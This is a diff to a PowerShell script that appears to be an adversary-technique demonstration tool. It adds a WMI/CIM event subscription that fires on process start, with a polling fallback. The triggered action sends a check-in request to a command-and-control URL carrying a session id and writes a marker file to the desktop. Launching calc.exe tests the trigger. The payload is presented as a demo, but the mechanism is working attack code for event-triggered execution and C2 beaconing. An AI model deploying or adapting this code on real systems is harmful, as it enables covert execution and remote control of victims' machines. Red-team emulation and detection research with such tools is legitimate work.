@@ -310,6 +310,15 @@ function Set-EnvPayload {
     Write-Host "    [OK] Environment variable cleaned up." -ForegroundColor Green
 }
 
+# Helper used by session/event actions to run the demo payload
+function Invoke-WmiPayloadAction {
+    try {
+        Invoke-RestMethod -Uri "$Global:C2Url/?message=how-are-you-session=$($Global:UniqueId)" -Method Get -ErrorAction SilentlyContinue
+        $desktop = [Environment]::GetFolderPath('Desktop')
+        Add-Content -Path (Join-Path $desktop 'calcLOG.txt') -Value "Executed payload at $(Get-Date -Format o) by session $($Global:UniqueId)" -ErrorAction SilentlyContinue
+    } catch { }
+}
+
 
 # ==========================================================================
 # TECHNIQUE 5: REGISTRY PERSISTENCE
@@ -563,40 +572,66 @@ function Show-WMIEventSub {
             $sid = $Global:UniqueId
             $dp = $desktopPath
 
-            $action = {
-                try {
-                    Invoke-RestMethod -Uri "$using:c2Url/?message=how-are-you-session=$using:sid" -Method Get -ErrorAction SilentlyContinue
-                    Add-Content -Path (Join-Path $using:dp 'calcLOG.txt') -Value 'Successfully executed payload via WMI.' -ErrorAction SilentlyContinue
-                } catch { }
-            }
+            # Try session-based registration first (CIM/WMI). If that fails, fall back to a simple polling demo.
+            $registered = $false
 
             if (Get-Command -Name Register-CimIndicationEvent -ErrorAction SilentlyContinue) {
                 try {
-                    Register-CimIndicationEvent -Namespace 'root\cimv2' -Query $query -SourceIdentifier $source -Action $action -ErrorAction Stop
+                    Register-CimIndicationEvent -Namespace 'root\cimv2' -Query $query -SourceIdentifier $source -Action { Invoke-WmiPayloadAction } -ErrorAction Stop
                     Write-Host "    [OK] Registered session-based WMI subscription (SourceIdentifier: $source)." -ForegroundColor Green
                     Write-Host "    [*] Note: this subscription is session-bound and will not persist across sessions." -ForegroundColor Yellow
-                    return
+                    $registered = $true
                 }
                 catch {
-                    Write-Error "    [!] Failed to register session-based CIM subscription: $($_.Exception.Message)"
-                    return
+                    Write-Warning "    [!] Failed to register session-based CIM subscription: $($_.Exception.Message)"
+                    $registered = $false
                 }
             }
 
-            if (Get-Command -Name Register-WmiEvent -ErrorAction SilentlyContinue) {
+            if (-not $registered -and (Get-Command -Name Register-WmiEvent -ErrorAction SilentlyContinue)) {
                 try {
-                    Register-WmiEvent -Query $query -SourceIdentifier $source -Action $action -Namespace 'root\cimv2' -ErrorAction Stop
+                    Register-WmiEvent -Query $query -SourceIdentifier $source -Action { Invoke-WmiPayloadAction } -Namespace 'root\cimv2' -ErrorAction Stop
                     Write-Host "    [OK] Registered session-based WMI subscription (SourceIdentifier: $source)." -ForegroundColor Green
                     Write-Host "    [*] Note: this subscription is session-bound and will not persist across sessions." -ForegroundColor Yellow
-                    return
+                    $registered = $true
                 }
                 catch {
-                    Write-Error "    [!] Failed to register session-based WMI subscription: $($_.Exception.Message)"
-                    return
+                    Write-Warning "    [!] Failed to register session-based WMI subscription: $($_.Exception.Message)"
+                    $registered = $false
                 }
             }
 
-            Write-Error "    [!] No session-based registration cmdlets available; cannot create WMI subscription on this host." 
+            if ($registered) {
+                # Basic immediate test: spawn calc and see if the payload creates the desktop file
+                Write-Host "    [*] Running quick test trigger (starting calc.exe)..." -ForegroundColor Gray
+                Start-Process calc.exe -NoNewWindow
+                Start-Sleep -Seconds 3
+                if (Test-Path (Join-Path $dp 'calcLOG.txt')) {
+                    Write-Host "    [OK] Session-based WMI action executed: calcLOG.txt created." -ForegroundColor Green
+                }
+                else {
+                    Write-Host "    [!] Session-based WMI action not observed (no calcLOG.txt)." -ForegroundColor Yellow
+                }
+                return
+            }
+
+            # Polling fallback: no registration possible, poll process list briefly to demonstrate
+            Write-Host "    [*] Session registration unavailable; using polling fallback for demo." -ForegroundColor Yellow
+            $existingIds = Get-Process | Select-Object -ExpandProperty Id
+            Start-Process calc.exe -NoNewWindow
+            $found = $false
+            for ($i=0; $i -lt 8 -and -not $found; $i++) {
+                Start-Sleep -Seconds 1
+                $currentIds = Get-Process | Select-Object -ExpandProperty Id
+                $new = $currentIds | Where-Object { $existingIds -notcontains $_ }
+                if ($new) {
+                    try { Invoke-WmiPayloadAction } catch {}
+                    Write-Host "    [OK] Polling fallback detected new process and executed payload." -ForegroundColor Green
+                    $found = $true
+                    break
+                }
+            }
+            if (-not $found) { Write-Host "    [!] Polling fallback did not detect new process." -ForegroundColor Yellow }
             return
         }
 
